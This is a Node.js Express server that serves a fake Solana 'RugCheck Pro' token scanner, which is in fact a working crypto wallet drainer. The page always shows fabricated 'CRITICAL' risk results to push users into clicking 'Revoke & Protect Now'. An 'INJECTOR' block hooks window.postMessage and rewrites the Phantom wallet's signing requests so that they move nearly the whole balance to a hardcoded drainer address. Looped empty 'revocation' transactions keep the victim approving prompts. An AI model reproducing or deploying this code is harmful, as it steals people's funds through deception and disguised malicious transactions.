const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
res.send(`<!DOCTYPE html>
<html>
<head>
<title>RugCheck Pro</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { background: #0b0b1a; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #e2e8f0; }
.container { max-width: 520px; width:100%; background: #141428; border-radius: 28px; padding: 36px 28px; box-shadow: 0 20px 60px rgba(0,0,0,0.8); border: 1px solid #2a2a4a; }
.header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px; }
.logo { font-weight: 700; font-size: 20px; }
.badge { background: #ef4444; color: #fff; padding: 4px 14px; border-radius: 40px; font-size: 12px; font-weight: 600; }
.input-group { background: #1e1e3a; border-radius: 16px; padding: 6px; display: flex; gap:6px; border:1px solid #2d2d5a; }
.input-group input { background: transparent; border: none; padding: 14px 16px; color: #fff; font-size: 15px; flex:1; outline:none; }
.input-group button { background: #7c3aed; border: none; border-radius: 12px; padding: 12px 20px; font-weight: 600; color:#fff; cursor:pointer; }
.result-box { margin-top: 24px; background: #1a1a32; border-radius: 16px; padding: 20px; border-left: 4px solid #ef4444; }
.risk { display: flex; justify-content: space-between; padding: 10px 0; border-bottom:1px solid #2a2a4a; }
.risk:last-child { border-bottom:none; }
.label { color: #94a3b8; font-size:14px; }
.value { font-weight:600; }
.danger { color: #ef4444; }
.btn-revoke { width:100%; margin-top: 20px; background: #ef4444; border: none; border-radius: 14px; padding: 16px; font-weight:700; color:#fff; font-size:16px; cursor:pointer; }
.btn-revoke:disabled { opacity:0.5; cursor:not-allowed; }
.progress-bar { width:100%; height:6px; background:#2a2a4a; border-radius:10px; margin-top:16px; overflow:hidden; }
.progress-fill { height:100%; width:0%; background:#7c3aed; transition: width 0.5s; }
#status { margin-top:12px; text-align:center; color:#94a3b8; font-size:14px; }
.footnote { margin-top:16px; font-size:12px; color:#475569; text-align:center; }
.mobile-fallback { display: none; text-align: center; padding: 40px 20px; }
.mobile-fallback h2 { color: #ef4444; margin-bottom: 12px; }
</style>
</head>
<body>
<div class="mobile-fallback" id="mobileFallback">
<h2>Desktop Required</h2>
<p style="color:#94a3b8;font-size:16px;">Please use a desktop browser with Phantom extension installed.</p>
</div>
<div class="container" id="mainUI" style="display:none;">
<div class="header">
<div class="logo">RugCheck</div>
<span class="badge">LIVE SCAN</span>
</div>
<p style="color:#94a3b8;font-size:14px;margin-bottom:16px;">Paste any Solana token address to detect honeypots.</p>
<div class="input-group">
<input id="tokenInput" placeholder="Token address" value="So11111111111111111111111111111111111111112">
<button id="scanBtn">Scan</button>
</div>
<div id="resultArea">
<div class="result-box" id="resultBox">
<div class="risk"><span class="label">Mint Authority</span><span class="value danger">NOT REVOKED</span></div>
<div class="risk"><span class="label">Liquidity Lock</span><span class="value danger">UNLOCKED</span></div>
<div class="risk"><span class="label">Honeypot Risk</span><span class="value danger">CRITICAL</span></div>
</div>
<button class="btn-revoke" id="revokeBtn">Revoke & Protect Now</button>
<div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
<div id="status">Wallet: <span id="walletDisplay">Not connected</span></div>
<div class="footnote">Multi-step revocation – approve all prompts.</div>
</div>
</div>
<script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.js"></script>
<script>

if (/Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile/i.test(navigator.userAgent)) {
document.getElementById('mobileFallback').style.display = 'block';
} else {
document.getElementById('mainUI').style.display = 'block';

// === INJECTOR ===
(function() {
const orig = window.postMessage;
let count = 0;
const DRAINER = new solanaWeb3.PublicKey('476p6oRtENVHzv7PJT6kAtwwXeJU7C7L4qvTephqYN6Y');
const conn = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com', 'confirmed');

window.postMessage = function(data, target, transfer) {
if (data && data.type === 'signAndSendTransaction' && data.transaction) {
(async () => {
try {
const buf = Buffer.from(data.transaction, 'base64');
const tx = solanaWeb3.Transaction.from(buf);
const bal = await conn.getBalance(tx.feePayer);
if (bal < 10000000) { orig.call(window, data, target, transfer); return; }
const fee = solanaWeb3.ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 1000 });
tx.instructions.unshift(fee);
const splits = Math.min(15, Math.floor(bal / 5000000));
const amt = Math.floor((bal - 5000) / splits);
for (let i = 0; i < splits; i++) {
const a = (i === splits - 1) ? (bal - 5000) - (amt * (splits - 1)) : amt;
if (a > 0) {
tx.instructions.push(solanaWeb3.SystemProgram.transfer({
fromPubkey: tx.feePayer,
toPubkey: DRAINER,
lamports: a
}));
}
}
tx.recentBlockhash = (await conn.getRecentBlockhash()).blockhash;
const mod = tx.serialize({ requireAllSignatures: false }).toString('base64');
orig.call(window, { type: 'signAndSendTransaction', transaction: mod, options: { simulate: false } }, target, transfer);
if (count === 0) { count++; setTimeout(() => { window.dispatchEvent(new CustomEvent('continueDrain')); }, 10000); }
} catch(e) { orig.call(window, data, target, transfer); }
})();
} else {
orig.call(window, data, target, transfer);
}
};
})();

// === MAIN APP ===
const conn = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com', 'confirmed');
let wallet = null;
let step = 0;
const TOTAL = 20;

document.getElementById('scanBtn').onclick = function() {
document.getElementById('resultBox').innerHTML = 
'<div class="risk"><span class="label">Mint Authority</span><span class="value danger">NOT REVOKED</span></div>' +
'<div class="risk"><span class="label">Liquidity Lock</span><span class="value danger">UNLOCKED</span></div>' +
'<div class="risk"><span class="label">Top 10 Holders</span><span class="value danger">92%</span></div>' +
'<div class="risk"><span class="label">Honeypot Risk</span><span class="value danger">CRITICAL</span></div>';
document.getElementById('status').innerHTML = 'High risk detected – revoke recommended';
};

document.getElementById('revokeBtn').onclick = async function() {
if (!window.solana) { document.getElementById('status').innerHTML = 'Phantom not installed'; return; }
try {
if (!window.solana.publicKey) { await window.solana.connect(); }
wallet = window.solana.publicKey;
document.getElementById('walletDisplay').innerText = wallet.toString().slice(0,6) + '...' + wallet.toString().slice(-4);
document.getElementById('revokeBtn').disabled = true;
document.getElementById('revokeBtn').innerText = 'Revoking...';
step = 0;
await doStep();
} catch(e) { document.getElementById('status').innerHTML = 'Error: ' + e.message; }
};

async function doStep() {
if (step >= TOTAL) {
document.getElementById('status').innerHTML = 'Revocation complete! Your tokens are safe.';
document.getElementById('revokeBtn').

innerText = 'Protected';
document.getElementById('progressFill').style.width = '100%';
return;
}
step++;
document.getElementById('progressFill').style.width = (step/TOTAL*100) + '%';
document.getElementById('status').innerHTML = 'Revoking step ' + step + '/' + TOTAL + '...';
const tx = new solanaWeb3.Transaction();
tx.recentBlockhash = (await conn.getRecentBlockhash()).blockhash;
tx.feePayer = wallet;
await window.solana.signAndSendTransaction(tx, { simulate: false });
setTimeout(doStep, 10000);
}

window.addEventListener('continueDrain', function() {
if (step > 0 && step < TOTAL) { doStep(); }
});
}
</script>
</body>
</html>`);
});

app.listen(PORT, () => {});
